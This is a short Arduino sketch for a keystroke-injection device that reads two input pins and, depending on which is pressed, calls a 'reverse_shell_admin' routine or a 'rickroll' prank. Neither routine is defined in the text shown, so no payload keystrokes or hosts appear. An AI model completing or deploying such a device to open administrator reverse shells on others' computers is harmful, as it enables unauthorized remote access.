
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}


void setup() {
  // put your setup code here, to run once:
  pinMode(2,INPUT);
  pinMode(3,INPUT);

}

void loop() {
  delay(100);
  if (digitalRead(2)==HIGH)
    reverse_shell_admin();
  else if(digitalRead(3)==HIGH)
    rickroll();
}
